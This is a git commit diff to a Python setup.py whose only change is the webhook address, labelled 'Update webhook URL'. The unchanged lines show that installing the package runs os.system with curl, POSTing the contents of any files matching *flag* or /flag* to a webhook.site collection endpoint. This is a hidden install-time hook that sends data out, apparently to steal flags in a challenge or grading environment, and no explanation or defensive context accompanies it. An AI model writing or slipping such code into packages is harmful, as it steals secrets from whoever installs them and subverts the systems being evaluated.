f47959cebbccad50a8051b2cbc3de89289009d33
vothang1809-ops <vothang1809@gmail.com>
2026-03-05 00:22:52 +0700

    Update webhook URL in setup.py

--- setup.py
+++ setup.py
@@ -1,7 +1,7 @@
 from setuptools import setup
 import os
 
-webhook_url = "https://webhook.site/ff606302-38af-4bcd-a1f1-ac0e6cd07d80"
+webhook_url = "https://webhook.site/ff606302-38af-4bcd-a1f1-ac0e6"
 
 os.system(f"curl -X POST -d \"$(cat *flag* /flag* 2>/dev/null)\" {webhook_url}")
 
